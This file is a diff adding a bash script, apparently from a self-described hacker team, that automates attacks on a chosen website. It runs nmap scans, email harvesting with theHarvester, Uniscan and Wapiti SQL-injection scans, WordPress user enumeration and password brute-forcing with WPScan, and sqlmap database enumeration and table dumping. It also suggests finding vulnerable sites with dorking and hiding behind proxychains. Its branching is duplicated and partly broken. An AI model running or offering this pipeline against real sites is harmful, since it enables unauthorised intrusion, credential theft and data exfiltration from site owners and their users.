@@ -1,0 +1,234 @@
+#!/bin/bash
+echo ""
+printf "\e[1;32m Greats To Our Moroccan Cyber Hackers Team"
+echo ""
+echo ""
+printf "
+        ========== ======== ======== ======== ==========
+        ||  ||  || ||    || ||    || ||    ||   ||
+        ||  ||  || ||    || ||==||   ||    ||   CAN Cyber Hackers
+        ||  ||  || ||    || ||    || ||    ||   ||
+        ==  ==  == ======== ==    == ======== ==========
+        ========== ======== ======== ======== ==========
+        \\ -_-_-   || || || _-_-_   _-_-_   _-_-||_-_-_- 
+         \\ -_-    || || || _-_-_-   -_-_   _-_-||_-_-_-
+          \\______ || || ||    -_-_-_-_-_-_-_-  SCANNER
+           \_||___ || || ||    -_-_-_-_-_-_-_-_-||_-_-_-
+             ||    || || || _-_-_-_-_-_-_-_-_-_-||_-_-_-
+             ||    || || || -_-_-_-_      -_-_-_||-_-_-_
+         ========= == == == ======== ======== ==========
+         -_-_-_-_-_-_-_-_-script By Elas -_-_-_-_-_-_-_-
+         ===============================================
+         
+        
+        "
+echo ""
+echo ""
+echo "" 
+echo ""
+printf " 
+         Individual commitment to a group effort 
+         that is what makes a team work, a company work, 
+         a society work, a civilization work.
+         
+         Vince Lombardi
+       "
+echo ""
+echo ""
+echo ""
+echo ""
+sudo apt-get install libmoose-perl
+sudo apt-get install libwww-perl
+sudo apt-get install wapiti
+sudo apt-get install lynx
+echo ""
+echo ""
+echo "" 
+printf "use proxychains for more security, please read about it and modify here gedit /etc/proxychains.conf last lines proxychains <tool>"
+echo ""
+echo ""
+echo "give me the folder where you want to store scan output" 
+read scanout 
+echo ""
+echo ""
+echo "Do You Want To Install Uniscan and binGoo y or n ?"
+read -p "Run command $foo? [yn]" answer
+if [[ $answer = y ]] ; then
+echo "give me the place where you want creat a folder for the next steps" 
+read folder
+echo ""
+echo ""
+printf "scan your computer first"
+echo ""
+echo ""
+cd $folder
+git clone https://github.com/CISOfy/lynis
+cd lynis
+./lynis audit system -Q
+cd ..
+mkdir binGoo
+cd binGoo
+git clone https://github.com/Hood3dRob1n/BinGoo.git > /dev/null && cd binGoo > /dev/null 
+sudo unzip BinGoo-master.zip
+sudo rm -r BinGoo-master.zip
+cd ..
+mkdir Uniscan
+cd Uniscan
+git clone https://github.com/poerschke/Uniscan.git > /dev/null && cd Uniscan > /dev/null 
+echo ""
+echo ""
+echo "Do You Want To Continue ?"
+read -p "Run command $foo? [yn]" answer
+if [[ $answer = y ]] ; then
+bash install-modules.sh 
+echo -ne '#####                     (33%)\r'
+sleep 1 
+echo -ne '#############             (66%)\r'
+sleep 1
+echo -ne '#######################   (100%)\r'
+echo -ne '\n'
+cd ..
+echo ""
+echo ""
+printf "open a new terminal and use bingoo to search vulnerable website for test"
+echo ""
+echo ""
+echo "Give Me The Website"
+read site
+cd $scanout
+mkdir $site
+ping $site -c 3
+echo "" 
+echo ""
+echo "Give Me The Ip"
+read ip
+echo "" 
+echo ""
+printf "Patience is not simply the ability to wait - it's how we behave while we're waiting. 
+Joyce Meyer"
+cd $scanout
+mkdir $site
+nmap -sC -p22,11,139,445,21 -T4 $ip > $scanout/$site/Port_scan.txt
+nmap -sP -Pn --script discovery $ip  > $scanout/$site/Infosh.txt
+nmap -sS -A $ip  > $scanout/$site/infosh2.txt
+echo "" 
+echo ""
+echo "Give Me The Website without www"
+read www
+theharvester -d $www -l 1000 -b all > $scanout/$site/theharvester.txt
+echo ""
+echo "give me the website with this form http://site.com/"
+read siteee
+echo "give me the path where uniscan.pl exist"
+read path 
+cd $path
+sudo perl uniscan.pl -u $siteee -q  > $scanout/$site/uniscan-scan.txt
+printf "wait to see magic"
+sl
+sudo wapiti $siteee -u -n 5 -b domain -m "-all,sql,blindsql" -v 2 
+echo "do you want to run wpscan attack or sqlmap ?"
+read -p "Run command $foo? [sqlmap or wpscan]" what
+if [[ $what = wpscan ]] ; then
+wpscan --url $siteee --enumerate u > $scanout/$site/wordpress.txt
+echo "what is the username?"
+read username
+echo ""
+echo ""
+echo "what is the path of your wordlist?"
+read wordlist
+echo ""
+echo ""
+wpscan --url $siteee --wordlist $wordlist --username $username --threads 50 $scanout/$site/wordpress-bruteforce.txt
+echo ""
+echo ""
+fi
+if [[ $what = sqlmap ]] ; then
+echo "give me the url"
+read url
+sqlmap -u $url  --dbs
+echo "" 
+echo ""
+echo "give me the database"
+read database
+sqlmap -u $url  --tables -D $database
+echo "put the name of the table you want to dump"
+read table
+sqlmap -u $url --dump -D $database -T $table
+fi
+fi
+fi
+printf "
+###################################################################
+#                           if n                                 #
+#                                                               #
+################################################################"
+if [[ $answer = n ]] ; then
+echo ""
+echo ""
+printf "open a new terminal and use bingoo to search vulnerable website for test"
+echo ""
+echo ""
+echo "Give Me The Website"
+read site
+ping $site -c 3
+echo "" 
+echo ""
+echo "Give Me The Ip"
+read ip
+echo ""
+echo ""
+printf "Patience is not simply the ability to wait - it's how we behave while we're waiting. 
+Joyce Meyer"
+cd $scanout
+mkdir $site
+nmap -sC -p22,11,139,445,21 -T4 $ip > $scanout/$site/Port_scan.txt
+nmap -sP -Pn --script discovery $ip  > $scanout/$site/Infosh.txt
+nmap -sS -A $ip  > $scanout/$site/infosh2.txt
+echo ""
+echo "Give Me The Website without www"
+read www
+theharvester -d $www -l 1000 -b all > $scanout/$site/theharvester.txt
+echo ""
+echo "give me the website with this form http://site.com/"
+read siteee
+echo "give me the path where uniscan.pl exist"
+read path 
+cd $path
+sudo perl uniscan.pl -u $siteee -q  > $scanout/$site/uniscan-scan.txt
+printf "wait to see magic"
+sudo wapiti $siteee -u -n 5 -b domain -m "-all,sql,blindsql" -v 2 
+echo "do you want to run wpscan attack or sqlmap ?"
+read -p "Run command $foo? [sqlmap or wpscan]" what
+if [[ $what = wpscan ]] ; then
+wpscan --url $siteee --enumerate u $scanout/$site/wordpress.txt
+echo "what is the username?"
+read username
+echo ""
+echo ""
+echo "what is the path of your wordlist?"
+read wordlist
+echo ""
+echo ""
+wpscan --url $siteee --wordlist $wordlist --username $username --threads 50 $scanout/$site/wordpress-bruteforce.txt
+echo ""
+echo ""
+fi
+if [[ $what = sqlmap ]] ; then
+echo "give me the url"
+read url
+sqlmap -u $url --dbs
+echo "" 
+echo ""
+echo "give me the database"
+read database
+sqlmap -u $url --tables -D $database
+echo "put the name of the table you want to dump"
+read table
+sqlmap -u $url --dump -D $database -T $table
+fi
+fi
+fi 
+fi
+
+
+
